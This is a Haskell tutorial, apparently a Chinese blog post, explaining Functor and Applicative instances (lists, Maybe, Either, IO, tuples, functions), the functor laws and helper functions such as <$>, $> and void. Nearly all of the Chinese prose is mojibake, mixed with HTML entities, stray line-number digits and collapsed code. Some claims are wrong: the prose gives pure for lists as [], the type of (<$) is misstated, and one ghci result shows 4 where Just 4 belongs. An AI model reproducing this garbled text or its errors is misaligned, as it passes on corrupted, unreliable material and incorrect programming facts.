·ï¼Œå®ƒè§„å®šäº†å…¶å®ä¾‹ç±»å¿…é¡»å®ç°çš„åŠŸèƒ½ï¼ˆä¾‹å¦‚Eqç±»å‹ç±»è§„å®šäº†å®ƒçš„å®ä¾‹å¿…é¡»æ˜¯å¯ä»¥æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰çš„ï¼‰ï¼ŒFunctorè§„å®šç±»å®ƒçš„å®ä¾‹å¿…é¡»æ˜¯å¯ä»¥è¿›è¡Œæ˜ å°„çš„ã€‚Functorè¦æ±‚ä½¿ç”¨fmap :: (a -&gt; b) -&gt; f a -&gt; f b å‡½æ•°æ¥å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œå®ƒæ¥æ”¶ä¸€ä¸ªa -&gt; bç±»å‹çš„å‡½æ•°ã€ä¸€ä¸ªå†…éƒ¨å…ƒç´ ä¸ºaç±»å‹çš„å‡½å­ï¼Œè¿”å›ä¸€ä¸ªå†…éƒ¨å…ƒç´ ä¸ºbç±»å‹çš„å‡½å­ Functorå¯ä»¥æ¯”ä½œç›’å­ï¼Œé‚£fmapå‡½æ•°å°±ç›¸å½“äºç»™å®šä¸€ä¸ªå‡½æ•°å’Œä¸€ä¸ªç›’å­ï¼Œå°†ç›’å­ä¸­çš„å…¨éƒ¨å…ƒç´ éƒ½åº”ç”¨è¿™ä¸ªå‡½æ•°ï¼Œå†è¿”å›åº”ç”¨å‡½æ•°åçš„ç›’å­ å‡½å­çš„å®ä¾‹å¿…é¡»æ˜¯ä¸€ä¸ªKindä¸º* -&gt; *çš„ç±»å‹æ„é€ å™¨ï¼Œå› ä¸ºå®ƒè¦æ±‚å…¶æ˜¯ä¸€ä¸ªç›’å­ï¼Œç›’å­åœ¨æ¥æ”¶å†…å®¹åæ‰ä¼šæˆä¸ºä¸€ä¸ªå…·ä½“çš„ç±»å‹ã€‚fmapä¸­çš„f aå’Œf bä¹Ÿæ˜¯å› ä¸ºfæ˜¯ä¸€ä¸ªç±»å‹æ„é€ å™¨ï¼Œåœ¨æ¥æ”¶ç±»å‹a/båæ‰ä¼šå˜æˆä¸€ä¸ªå…·ä½“ç±»å‹ï¼ˆf aå’Œf bï¼‰å‡ºç°åœ¨å‡½æ•°ç±»å‹å£°æ˜ä¸­ Functorçš„å®šä¹‰æ˜¯: 1234class Functor f where fmap :: (a -&gt; b) -&gt; f a -&gt; f b (&lt;$) :: a -&gt; f a -&gt; f b (&lt;$) = fmap . const å¯ä»¥å‘ç°Functorä¸ä»…éœ€è¦fmapå‡½æ•°ï¼Œè¿˜éœ€è¦ä¸€ä¸ª&lt;$å‡½æ•°ï¼Œå®ƒæ¥æ”¶ä¸€ä¸ªaç±»å‹çš„å˜é‡å’Œä¸€ä¸ªå†…å®¹ä¸ºbç±»å‹çš„å‡½å­ï¼Œè¿”å›ä¸€ä¸ªå†…å®¹ä¸ºaç±»å‹çš„å‡½å­ï¼›ä½œç”¨å°±æ˜¯å°†ä¼ å…¥çš„å‡½å­ä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½æ›¿æ¢ä¸ºä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæ¯”å¦‚ï¼š 12ghci&gt; 'a' &lt;$ [1, 2, 3]&quot;aaa&quot; ä½†å®ƒä¸æ˜¯å£°æ˜ä¸€ä¸ªå‡½å­å®ä¾‹å¿…é¡»çš„ï¼Œå› ä¸ºå®ƒå¯ä»¥ä½¿ç”¨fmapå’Œconstå‡½æ•°å¤åˆæ¥å®ç°ï¼Œå…¶ä¸­constçš„ç±»å‹ç­¾åï¼š const :: a -> b -> a å³æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä½†å§‹ç»ˆåªè¿”å›ç¬¬ä¸€ä¸ªå‚æ•° Functorå®ä¾‹[]åˆ—è¡¨[]æ˜¯ä¸€ä¸ªå‡½å­ï¼Œå®ƒé€šè¿‡mapå‡½æ•°æ¥å®ç°fmapçš„åŠŸèƒ½ï¼š 12instance Functor [] where fmap = map map :: (a -> b) -> [a] -> [b] mapå’Œfmapè¦æ±‚çš„ç›¸åŒï¼Œè¾¾æˆçš„ç›®çš„ä¹Ÿä¸€è‡´ã€‚mapæ¥æ”¶ä¸€ä¸ªå‡½æ•°å’Œä¸€ä¸ªåˆ—è¡¨ï¼Œå®ƒä¼šå°†åˆ—è¡¨ä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½åº”ç”¨è¿™ä¸ªå‡½æ•°åå†è¿”å›è¿™ä¸ªåˆ—è¡¨ MaybeMaybeä¹Ÿå…·æœ‰kind * -&gt; *ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªå‡½å­ï¼š 12345678instance Functor Maybe where fmap f Nothing = Nothing fmap f (Just x) = Just (f x)ghci&gt; fmap (*2) NothingNothingghci&gt; fmap (*2) (Just 2)Just 4 Either aEitherçš„kindæ˜¯* -&gt; * -&gt; *ï¼Œæ˜¾ç„¶å®ƒä¸æ˜¯å‡½å­ï¼Œä½†æ˜¯å›ºå®šäº†ä¸€ä¸ªä¼ å…¥ç±»å‹çš„Either açš„kindæ˜¯* -&gt; *ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå‡½å­ï¼š 12345678instance Functor (Either a) where fmap f (Left x) = Left x fmap f (Right x) = Right (f x)ghci&gt; fmap (*2) (Left 4)Left 4ghci&gt; fmap (*2) (Right 4)Right 8 å› ä¸ºä½¿ç”¨Eitheræ—¶ä¸€èˆ¬ç”¨å³å€¼è¡¨ç¤ºæ­£å¸¸ç»“æœï¼Œå·¦å€¼è¡¨ç¤ºå¼‚å¸¸ä¿¡æ¯ï¼Œæ‰€ä»¥ä½¿ç”¨fmapæ—¶åªå¯¹å³å€¼è¿›è¡Œæ“ä½œï¼Œå¦‚æœæ—¶å·¦å€¼åˆ™ä¿æŒä¸å˜ï¼ˆè€Œä¸”å·¦å€¼æ­¤æ—¶ä¹Ÿä½œä¸ºç¡®å®šç±»å‹ç¡®å®šå€¼å­˜åœ¨ï¼‰ IOIOä¹Ÿæ˜¯ä¸€ä¸ªå‡½å­ï¼Œä½¿ç”¨fmapå¯¹IOä¸­å†…å®¹åº”ç”¨å‡½æ•°ï¼š 12345678instance Functor IO where fmap f action = do result &lt;- action return (f result)ghci&gt; fmap (&quot;input: &quot;++) getLinetest&quot;input: test&quot; (,) a(,)è¡¨ç¤ºä¸€ä¸ªäºŒå…ƒç»„çš„ç±»å‹æ„é€ å™¨ï¼Œ(,) :: * -&gt; * -&gt; *ï¼Œè€Œç¡®å®šäº†ç¬¬ä¸€ä¸ªå…ƒç´ çš„ç±»å‹åå°±å˜æˆäº†(,) aï¼Œå®ƒçš„kindæ˜¯* -&gt; *ã€‚ä¹Ÿæ˜¯ä¸€ä¸ªå‡½å­ï¼Œè¿›è¡Œfmapå‡½æ•°æ—¶åªå¯¹ç¬¬äºŒä¸ªå…ƒç´ åº”ç”¨ï¼š 12instance Functor ((,) a) where fmap f (x, y) = (x, f y) åªå‰©ä¸€ä¸ªå…ƒç´ çš„ä¸‰å…ƒç»„å’Œå››å…ƒç»„ä¹Ÿéƒ½æ˜¯å‡½å­ï¼Œfmapä¹Ÿåªå¯¹æœ€åä¸€ä¸ªå…ƒç´ åº”ç”¨ï¼š 12345instance Functor ((,,) a b) where fmap f (a, b, c) = (a, b, f c)instance Functor ((,,,) a b c) where fmap f (a, b, c, d) = (a, b, c, f d) (-&gt;) r-&gt;ä¹Ÿæ˜¯ä¸€ä¸ªç±»å‹æ„é€ å™¨ï¼Œå®ƒçš„kindï¼š (->) :: * -> * -> * ä¸€ä¸ªæ˜ å°„ï¼ˆä¸€å…ƒå‡½æ•°ï¼‰çš„ç±»å‹a -&gt; bä¹Ÿå¯ä»¥å†™æˆ(-&gt;) a bï¼Œå®ƒæ˜¯ç”±ç±»å‹aå’Œç±»å‹bè¾“å…¥åˆ°ç±»å‹æ„é€ å™¨-&gt;ä¸­åå½¢æˆçš„ä¸€ä¸ªå…·ä½“ç±»å‹ã€‚æ‰€ä»¥ç¡®å®šäº†è¾“å…¥ç±»å‹åçš„ä¸€å…ƒå‡½æ•°çš„ç±»å‹å°±æ˜¯(-&gt;) rï¼ˆå…¶ä¸­ræ˜¯è¾“å…¥çš„ç±»å‹ï¼‰ è§„å®šçš„fmapçš„ç±»å‹ç­¾åæ˜¯ï¼š fmap :: (a -> b) -> f a -> f b å…¶ä¸­çš„fæ˜¯å‡½å­ï¼Œè€Œåœ¨è¿™ä¸ªå®ä¾‹ä¸­(-&gt;) rå°±æ˜¯å‡½å­ï¼Œå°†å…¶å¸¦å…¥få¯ä»¥å¾—åˆ°ï¼š fmap :: (a -> b) -> ((-> r) a) -> ((-> r) b) æŠŠå…¶ä¸­çš„(-&gt;)æ¢æˆä¸­ç¼€å¯ä»¥å¾—åˆ°ï¼š fmap :: (a -> b) -> (r -> a) -> (r -> b) ä¼ å…¥ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªç±»å‹ä¸ºa -&gt; bï¼Œä¸€ä¸ªç±»å‹ä¸ºr -&gt; aï¼Œè¿”å›ä¸€ä¸ªå‡½æ•°ï¼Œç±»å‹ä¸ºr -&gt; bã€‚ä¸éš¾æ¨æµ‹è¿™ä¸ªfmapæ˜¯å°†è¿™ä¸¤ä¸ªå‡½æ•°å¤åˆäº†ï¼Œå…ˆå¯¹è¾“å…¥å¯¹råº”ç”¨ç¬¬äºŒä¸ªå‡½æ•°äº§ç”Ÿç±»å‹açš„ç»“æœï¼Œç„¶ååœ¨åº”ç”¨ç¬¬ä¸€ä¸ªå‡½æ•°äº§ç”Ÿç±»å‹bçš„ç»“æœï¼Œæ‰€ä»¥(-&gt;) rå®šä¹‰çš„fmapæ˜¯ï¼š 12instance Functor ((-&gt;) r) where fmap f g = (\\x -&gt; f (g x)) æ‰€ä»¥(-&gt;) rçš„fmapå…¶å®å°±æ˜¯å‡½æ•°å¤åˆ(.)ï¼š 12instance Functor ((-&gt;) r) where fmap = (.) 12345678ghci&gt; :t fmap (*3) (+100) fmap (*3) (+100) :: (Num a) =&gt; a -&gt; a ghci&gt; fmap (*3) (+100) 1 303 ghci&gt; (*3) `fmap` (+100) $ 1 303 ghci&gt; (*3) . (+100) $ 1 303 Functor Lawsæ‰€æœ‰çš„å‡½å­éƒ½åº”è¯¥æ»¡è¶³ä¸¤ä¸ªå®šå¾‹ã€‚è¿™ä¸¤ä¸ªå®šå¾‹ä¸æ˜¯Haskellå¼ºåˆ¶è¦æ±‚çš„ï¼Œä½†åº”è¯¥ç¡®ä¿ä¸€ä¸ªå‡½å­æ»¡è¶³è¿™ä¸¤ä¸ªå®šå¾‹ï¼š fmap id = idï¼ˆå…¶ä¸­idä¸ºå‡½æ•°(\\x -&gt; x)ï¼‰ï¼šå³å¯¹ä¸€ä¸ªå‡½å­fmap idï¼Œé‚£å®ƒåº”è¯¥è¿”å›æœ¬èº«ï¼ˆfmap id a = id a = aï¼Œaä¸ºä¸€ä¸ªå‡½å­ï¼‰ï¼Œæ¯”å¦‚ï¼š 1234ghci&gt; fmap id [1, 2, 3][1,2,3]ghci&gt; fmap id (Just 2)Just 2 fmap (f . g) = fmap f . fmap gï¼šå³å‡½å­çš„fmapæ”¯æŒç»“åˆå¾‹ fmap (f . g) a = fmap f . fmap g $ a = fmap f (fmap g a)ï¼Œå…¶ä¸­aä¸ºä¸€ä¸ªå‡½å­ fmap (f . g) (Just x) = fmap f (fmap g (Just x)) = fmap f (Just (g x)) = Just (f (g x)) 12ghci&gt; fmap ((*3) . (+100)) (Just 1)Just 303 æ»¡è¶³ç¬¬ä¸€ä¸ªå®šå¾‹çš„å‡½å­ä¸€å®šæ»¡è¶³ç¬¬äºŒä¸ªå®šå¾‹ï¼Œæ‰€ä»¥åªè¦æ£€æŸ¥å‡½å­æ˜¯å¦æ»¡è¶³ç¬¬ä¸€ä¸ªå®šå¾‹å³å¯ Intuitionå¯¹äºå‡½å­å’Œfmapï¼Œæœ‰ä¸¤ç§ç†è§£æ–¹æ³• å‡½å­æ˜¯ä¸€ç§å®¹å™¨ï¼ˆcontainerï¼‰ï¼›fmapæ¥æ”¶ä¸€ä¸ªå‡½æ•°å’Œä¸€ä¸ªå®¹å™¨ï¼Œåœ¨å®¹å™¨å†…éƒ¨åº”ç”¨è¿™ä¸ªå‡½æ•°ï¼Œè¿”å›åº”ç”¨åçš„æ–°å®¹å™¨ å‡½å­æ˜¯ä¸€ç§è®¡ç®—ä¸Šä¸‹æ–‡ï¼ˆcontextï¼‰ï¼›fmapæ˜¯æŸ¯é‡ŒåŒ–çš„ï¼ŒæŠŠå…¶ç±»å‹ç­¾åçœ‹ä½œfmap :: (a -> b) -> (f a -> f b) æ¥æ”¶ä¸€ä¸ªå‡½æ•°è¿”å›å¦ä¸€ä¸ªå‡½æ•°ï¼Œä¼ å…¥å‡½æ•°g :: a -> bï¼Œfmapå°†å…¶è½¬æ¢ä¸ºæ–°çš„å‡½æ•° fmap g :: f a -> f b ä½¿æ™®é€šçš„å‡½æ•°gå¯ä»¥åœ¨è®¡ç®—ä¸Šä¸‹æ–‡fä¸­ä½¿ç”¨ï¼Œè¿™ç§è½¬æ¢ä¹Ÿè¢«ç§°ä¸ºæå‡ï¼ˆliftï¼‰ å¸¸ç”¨å‡½æ•°&lt;$&gt;&lt;$&gt;å‡½æ•°æ˜¯fmapçš„ä¸­ç¼€å½¢å¼ï¼ˆå®ƒçœ‹ç€ç±»ä¼¼$ï¼Œf $ 3å°†fåº”ç”¨åœ¨å•ä¸ªå€¼3ä¸Šï¼Œè€Œf &lt;$&gt; [1, 2, 3]å°†fåº”ç”¨åœ¨ä¸€ä¸ªå‡½å­ä¸Šï¼Œä¹Ÿå°±æ˜¯åº”ç”¨åœ¨ä¸€ä¸ªå‡½å­å†…éƒ¨çš„æ‰€æœ‰å€¼ä¸Šï¼‰ï¼š 1234ghci&gt; fmap (*2) (Just 2)4ghci&gt; (*2) &lt;$&gt; Just 24 $&gt;$&gt;å‡½æ•°åŒ…å«åœ¨Data.Functoræ¨¡å—ä¸­ ($>) :: Functor f => f a -> b -> f b Functorå®šä¹‰æ—¶è¦æ±‚äº†&lt;$å‡½æ•°ï¼Œå°†å‡½å­å†…éƒ¨çš„å…ƒç´ å…¨éƒ¨æ›¿æ¢ä¸ºæŒ‡å®šçš„æŸä¸ªå€¼ï¼Œè€Œ$&gt;æ­£å¥½å°†&lt;$å‡½æ•°çš„ä¸¤ä¸ªå‚æ•°åäº†è¿‡æ¥ï¼Œç›¸å½“äºflip (&lt;$)ï¼š 1234ghci&gt; 'a' &lt;$ [1, 2, 3]&quot;aaa&quot;ghci&gt; [1, 2, 3] $&gt; 'a'&quot;aaa&quot; voidvoidå‡½æ•°ä¹ŸåŒ…å«åœ¨Data.Functoræ¨¡å—ä¸­ void :: Functor f => f a -> f () voidå‡½æ•°æŠŠä¸€ä¸ªå‡½å­å†…éƒ¨çš„å…¨éƒ¨å…ƒç´ éƒ½å˜æˆç©ºï¼ˆ()ï¼‰ï¼Œvoid xç›¸å½“äº() &lt;$ xï¼š 1234ghci&gt; void [1, 2, 3][(), (), ()]ghci&gt; void (Just 2)Just () Applicative Functoråº”ç”¨å‡½å­ï¼ˆApplicative Functorï¼‰æ˜¯å‡½å­çš„å‡çº§ç‰ˆï¼Œå®ƒåŒ…å«åœ¨Control.Applicativeæ¨¡å—ä¸­ã€‚ fmapè¿›è¡Œçš„æ“ä½œæ˜¯å°†ä¸€ä¸ªæ™®é€šä¸€å…ƒå‡½æ•°åº”ç”¨åœ¨ä¸€ä¸ªå‡½å­å†…éƒ¨ã€‚è€Œå¦‚æœè¦å°†ä¸€ä¸ªåŒ…å«å‡½æ•°çš„å‡½å­åº”ç”¨åœ¨å¦ä¸€ä¸ªå‡½å­ä¸Šï¼Œfmapå°±å¤„ç†ä¸äº†äº†ï¼Œä½†æ˜¯åº”ç”¨å‡½å­çš„æ–¹æ³•å¯ä»¥å¤„ç†ã€‚åº”ç”¨å‡½å­çš„å®šä¹‰ï¼š 123class Functor f =&gt; Applicative f where pure :: a -&gt; f a (&lt;*&gt;) :: f (a -&gt; b) -&gt; f a -&gt; f b åº”ç”¨å‡½å­è¦æ±‚å®ç°ä¸¤ä¸ªå‡½æ•°ï¼š pure :: a -&gt; f aï¼Œä¸éš¾ç†è§£ï¼Œpureæ¥æ”¶ä¸€ä¸ªå€¼ï¼Œå¹¶å°†å…¶æ”¾åœ¨é»˜è®¤çš„ä¸Šä¸‹æ–‡/å®¹å™¨ä¸­ã€‚å¯¹äºåˆ—è¡¨ï¼Œpure = []ï¼›å¯¹äºMaybeï¼Œpure = Just &lt;*&gt; :: f (a -&gt; b) -&gt; f a -&gt; f bï¼Œç±»ä¼¼äºfmap :: (a -&gt; b) -&gt; f a -&gt; f bï¼Œä½†ä¸åŒçš„æ˜¯&lt;*&gt;çš„ç¬¬ä¸€ä¸ªå‚æ•°çš„ç±»å‹æ˜¯f (a -&gt; b)ä¸æ˜¯a -&gt; bã€‚æ‰€ä»¥&lt;*&gt;çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­çš„å‡½æ•°ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ã€‚æ¢å¥è¯è¯´ï¼Œ&lt;*&gt;æ¥æ”¶ä¸€ä¸ªè£…æœ‰å‡½æ•°çš„å‡½å­å’Œå¦ä¸€ä¸ªå‡½å­ï¼Œåº”ç”¨å‡½æ•°åè¿”å›æ–°çš„å‡½å­ã€‚ Applicative Functorå®ä¾‹MaybeMaybeæ˜¯ä¸€ä¸ªåº”ç”¨å‡½å­ï¼š 1234instance Applicative Maybe where pure = Just Nothing &lt;*&gt; _ = Nothing (Just f) &lt;*&gt; something = fmap f something pureå‡½æ•°ï¼šå°†ä¸€ä¸ªå€¼æ”¾åœ¨é»˜è®¤çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œè€Œå¯¹äºMaybeï¼Œé»˜è®¤çš„ä¸Šä¸‹æ–‡å°±æ˜¯Justï¼Œæ‰€ä»¥pure x = Just x &lt;*&gt;å‡½æ•°ï¼šå°†è£…æœ‰å‡½æ•°çš„å‡½å­ä¸­çš„å‡½æ•°åº”ç”¨å¦ä¸€ä¸ªå‡½å­ä¸­ ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Nothingï¼Œå³ç¬¬ä¸€ä¸ªå‡½å­ä¸åŒ…å«å‡½æ•°ï¼Œé‚£è¿”å›çš„ç»“æœå°±ä¹Ÿä¼šæ˜¯Nothing ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è£…æœ‰å‡½æ•°fçš„å‡½å­Just fï¼Œå°†å…¶ä¸­çš„å‡½æ•°fåº”ç”¨åœ¨å‡½å­somethingä¸­ï¼Œåªéœ€è¦å°†fæå–å‡ºæ¥ä½¿ç”¨fmapåº”ç”¨åœ¨å‡½å­somethingä¸­å³å¯ å®é™…åº”ç”¨çš„ä¾‹å­ï¼š 12345678ghci&gt; Just (+3) &lt;*&gt; Just 9Just 12ghci&gt; pure (+3) &lt;*&gt; Just 9Just 12ghci&gt; (+3) &lt;$&gt; Just 9Just 12ghci&gt; Nothing &lt;*&gt; Just 9Nothing ç¬¬ä¸€ä¸ªä¾‹å­ï¼ŒJust (+3)æ˜¯ä¸€ä¸ªåŒ…å«å‡½æ•°(+3)çš„å‡½å­ï¼Œå°†å…¶åº”ç”¨åœ¨å‡½å­Just 9ä¸­ï¼Œå°†Just (+3)ä¸­çš„å‡½æ•°(+3)æå–å‡ºæ¥ï¼Œåº”ç”¨åœ¨Just 9ä¸­ï¼Œå¾—åˆ°äº†Just 12 ç¬¬äºŒä¸ªä¾‹å­ï¼Œå¯ä»¥å‘ç°ï¼Œåœ¨è¿™é‡Œpure (+3)å’ŒJust (+3)ç­‰æ•ˆï¼Œå› ä¸ºpureå°†å‡½æ•°(+3)æ”¾åœ¨é»˜è®¤ä¸Šä¸‹æ–‡ä¸­ï¼Œä¹Ÿå°±æ˜¯Justä¸­äº† è€Œ&lt;*&gt;èƒ½åšçš„ä¸æ­¢è¿™äº›ï¼Œä»–å¯ä»¥è¿ç»­ä¼ å…¥æ›´å¤šå‡½å­ä½œä¸ºå‚æ•°ï¼Œæ¯”å¦‚ï¼š 1234ghci&gt; pure (+) &lt;*&gt; Just 3 &lt;*&gt; Just 9Just 12ghci&gt; pure (\\x y z -&gt; x + y + z) &lt;*&gt; Just 3 &lt;*&gt; Just 4 &lt;*&gt; Just 5Just 12 &lt;*&gt;å‡½æ•°ä¸€æ ·æ˜¯é»˜è®¤å·¦ç»“åˆçš„ï¼Œpure (+) &lt;*&gt; Just 3 &lt;*&gt; Just 9ç›¸å½“äº(pure (+) &lt;*&gt; Just 3) &lt;*&gt; Just 9ï¼Œè€Œpure (+) &lt;*&gt; Just 3å°†(+)åº”ç”¨åœ¨Just 3ä¸Šï¼Œå¾—åˆ°çš„å°±æ˜¯Just (+3)ä¸€ä¸ªåŒ…å«å‡½æ•°çš„å‡½å­ï¼Œåˆå°†å…¶é€šè¿‡&lt;*&gt;åº”ç”¨åœ¨äº†Just 9ä¸Šï¼Œå¾—åˆ°äº†Just 12: 12345 pure (\\x y z -&gt; x + y + z) &lt;*&gt; Just 3 &lt;*&gt; Just 4 &lt;*&gt; Just 5= (pure (\\x y z -&gt; x + y + z) &lt;*&gt; Just 3) &lt;*&gt; Just 4 &lt;*&gt; Just 5= (Just (\\y z -&gt; 3 + y + z) &lt;*&gt; Just 4) &lt;*&gt; Just 5= Just (\\z -&gt; 3 + 4 + z) &lt;*&gt; Just 5 = Just (+7) &lt;*&gt; Just 5= Just 12 æ‰€ä»¥å¯ä»¥ä½¿ç”¨ç±»ä¼¼pure f &lt;*&gt; x &lt;*&gt; y &lt;*&gt; â€¦æ¥å°†ä¸€ä¸ªæ™®é€šå¤šå…ƒå‡½æ•°fåº”ç”¨åœ¨å¤šä¸ªå‡½å­ä¸Šã€‚ è€Œä¸”pure f &lt;*&gt; xå®é™…ä¸Šå…ˆå°†æ™®é€šå‡½æ•°fæ”¾åœ¨ä¸Šä¸‹æ–‡ä¸­ï¼Œç„¶åæ‰§è¡Œ&lt;*&gt;æ—¶å†å°†å…¶æå–å‡ºæ¥æ‰§è¡Œfmapï¼Œæ‰€ä»¥å®ƒå°±ç›¸å½“äºå°†æ™®é€šå‡½æ•°åº”ç”¨åœ¨å‡½å­xä¸Šï¼Œå³fmap f xï¼Œä¹Ÿå¯ä»¥å†™æˆf &lt;$&gt; xã€‚æ‰€ä»¥å¸¸ç”¨çš„å†™æ³•å°±æ˜¯ï¼š f x y ... []åˆ—è¡¨ä¹Ÿæ˜¯ä¸€ä¸ªåº”ç”¨å‡½å­ï¼š 123instance Applicative [] where pure x = [x] fs &lt;*&gt; xs = [f x | f &lt;- fs, x &lt;- xs] pureå‡½æ•°ï¼šå¯¹äºåˆ—è¡¨è€Œè¨€ï¼Œä¸€ä¸ªå€¼çš„æœ€å°ä¸Šä¸‹æ–‡å°±æ˜¯åªåŒ…å«è¿™ä¸ªå€¼çš„åˆ—è¡¨[x] &lt;*&gt;å‡½æ•°ï¼šåˆ—è¡¨çš„&lt;*&gt;å‡½æ•°æ˜¯é€šè¿‡åˆ—è¡¨æ¨å¯¼æ¥å®ç°çš„ã€‚å› ä¸ºä¸åŒäºMaybeçš„JuståªåŒ…å«ä¸€ä¸ªå€¼ï¼Œåˆ—è¡¨å¯ä»¥åŒ…å«å¾ˆå¤šå€¼ï¼Œç¬¬ä¸€ä¸ªä¼ å…¥çš„åˆ—è¡¨ä¸­å¯èƒ½ä¼šåŒ…å«å¾ˆå¤šå‡½æ•°ï¼Œç¬¬äºŒä¸ªä¼ å…¥çš„åˆ—è¡¨ä¹Ÿä¼šåŒ…å«å¾ˆå¤šå€¼ï¼Œæ‰€ä»¥å°±éœ€è¦å…ˆä»ç¬¬ä¸€ä¸ªåˆ—è¡¨ä¸­å–å‡ºä¸€ä¸ªå‡½æ•°ç„¶åä¾æ¬¡åº”ç”¨åœ¨ç¬¬äºŒä¸ªåˆ—è¡¨çš„æ¯ä¸ªå€¼ä¸­ï¼Œå†å–å‡ºç¬¬ä¸€ä¸ªåˆ—è¡¨ä¸­çš„ç¬¬äºŒä¸ªå‡½æ•°åº”ç”¨åœ¨ç¬¬äºŒä¸ªåˆ—è¡¨çš„æ¯ä¸ªå€¼ä¸­â€¦â€¦æœ€ç»ˆè¿”å›å¾—åˆ°çš„æ‰€æœ‰ç»“æœçš„åˆ—è¡¨ ä½¿ç”¨ä¾‹å­ï¼š 1234ghci&gt; [(+3), (*2)] &lt;*&gt; [1, 2][4,5,2,4]ghci&gt; [(+), (*)] &lt;*&gt; [1, 2] &lt;*&gt; [3, 4] [4, 5, 5, 6, 3, 4, 6, 8] IO123456instance Applicative IO where pure = return a &lt;*&gt; b = do f &lt;- a x &lt;- b return (f x) ä¹Ÿä¸éš¾ç†è§£ï¼Œpureå‡½æ•°ç›´æ¥å°†ä¼ å…¥çš„å€¼returnï¼Œç›¸å½“äºæ”¾åœ¨äº†IOçš„ä¸Šä¸‹æ–‡ä¸­ã€‚è€Œ&lt;*&gt;å‡½æ•°å…ˆå°†ä¸¤ä¸ªIOä¸­å†…å®¹æå–å‡ºæ¥ï¼Œç„¶ååº”ç”¨å‡½æ•°åreturnï¼Œå½¢æˆæ–°çš„IOå‡½å­ 1234ghci&gt; (++) &lt;$&gt; getLine &lt;*&gt; getLineLine1Line2&quot;Line1Line2&quot; (-&gt;) r(-&gt;) råŒæ ·ä¹Ÿæ˜¯ä¸€ä¸ªåº”ç”¨å‡½å­ï¼Œå’Œå‡½å­çš„åˆ†æä¸€æ ·ï¼Œå…ˆæ¥åˆ†æå®ƒçš„&lt;*&gt;å‡½æ•°çš„ç±»å‹ç­¾åï¼š :: f (a -> b) -> f a -> f b å…¶ä¸­fä¸º(-&gt;) rï¼Œå°†å…¶ä»£å…¥å¹¶æ›¿æ¢ä¸ºä¸­ç¼€ï¼š :: (r -> a -> b) -> (r -> a) -> (r -> b) å¯ä»¥çœ‹å‡ºå®ƒæ¥æ”¶ä¸¤ä¸ªå‡½æ•°f :: r -&gt; a -&gt; bã€g :: r -&gt; aï¼Œè¿”å›å¦ä¸€ä¸ªå‡½æ•°h :: (r -&gt; b) é‚£ä¹ˆè¿”å›çš„å‡½æ•°çš„è¾“å…¥ä¸ºrï¼Œè¾“å‡ºä¸ºbï¼Œæ‰€ä»¥å…ˆå¯¹è¾“å…¥åº”ç”¨å‡½æ•°gå¾—åˆ°aï¼Œç„¶ååœ¨å¯¹rå’Œaåº”ç”¨få¾—åˆ°bï¼Œæ‰€ä»¥æ¨æµ‹&lt;*&gt;å‡½æ•°çš„æ“ä½œå°±æ˜¯ï¼š \\x -> f x (g x) äºæ˜¯ï¼š 123instance Applicative ((-&gt;) r) where pure x = (\\_ -&gt; x) f &lt;*&gt; g = \\x -&gt; f x (g x) å°†ä¸€ä¸ªå€¼æ”¾åœ¨å‡½æ•°çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œæœ€å°ä¸Šä¸‹æ–‡å°±åº”è¯¥è¿”å›è¿™ä¸ªå€¼æœ¬èº«ï¼Œæ‰€ä»¥pureå‡½æ•°å®šä¹‰ä¸º(_ -&gt; x)ï¼Œå³æ— è®ºè¾“å…¥ä»€ä¹ˆï¼Œéƒ½è¿”å›x åº”ç”¨å‡½å­çš„&lt;*&gt;å‡½æ•°æ¥æ”¶ä¸¤ä¸ªå‡½å­ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„å‡½å­ã€‚å¯¹äº(-&gt;) rï¼Œå®ƒæ¥æ”¶ä¸¤ä¸ªå‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªæ–°çš„å‡½æ•°ã€‚å…·ä½“ä¾‹å­ï¼š 12ghci&gt; (+) &lt;$&gt; (+3) &lt;*&gt; (*100) $ 5508 æ‰§è¡Œè¿™å¥æ—¶å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿï¼š 12345678 (+) &lt;$&gt; (+3) &lt;*&gt; (*100) $ 5= ((+) &lt;$&gt; (+3)) &lt;*&gt; (*100) $ 5= ((+) . (+3)) &lt;*&gt; (*100) $ 5 = (\\a -&gt; (+) ((+3) a)) &lt;*&gt; (*100) $ 5= (\\a b -&gt; (a + 3 + b)) &lt;*&gt; (*100) $ 5= (\\x -&gt; x + 3 + ((*100) x)) $ 5= (\\x -&gt; x + 3 + x * 100) $ 5= 5 + 3 + 5 * 100 = 508= (5 + 3) + (5 * 100) æ‰€ä»¥å°±ç›¸å½“äºå…ˆå¯¹è¾“å…¥åˆ†åˆ«æ‰§è¡Œ(+3)å’Œ(*100)ï¼Œç„¶åå°†ä¸¤ä¸ªç»“æœæ‰§è¡Œäº†(+) åŒæ ·ï¼š 12ghci&gt; (\\x y z -&gt; [x,y,z]) &lt;$&gt; (+3) &lt;*&gt; (*2) &lt;*&gt; (/2) $ 5 [8.0,10.0,2.5] å…ˆå¯¹5åˆ†åˆ«æ‰§è¡Œ(+3)ã€(*2)ã€(/2)ï¼Œç„¶åå°†å¾—åˆ°çš„ä¸‰ä¸ªç»“æœä¼ å…¥(\\x y z -&gt; [x,y,z])å¾—åˆ°äº†æœ€ç»ˆçš„ç»“æœ 12 f &lt;$&gt; g &lt;*&gt; h &lt;*&gt; i= (\\x -&gt; f (g x) (h x) (i x)) 